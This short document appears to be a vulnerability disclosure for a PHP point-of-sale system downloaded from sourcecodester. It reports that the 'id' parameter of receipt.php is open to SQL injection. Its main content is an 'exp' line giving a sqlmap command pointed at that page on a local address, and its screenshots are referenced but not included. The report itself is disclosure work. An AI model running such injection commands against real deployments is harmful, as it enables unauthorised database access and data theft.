vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：

![image-20230223220348062](C:\markdown\images\image-20230223220348062.png)

exp

```
sqlmap.py -u "http://192.168.31.50/kruxton/receipt.php?id=1"
```

![image-20230223220326616](C:\markdown\images\image-20230223220326616.png)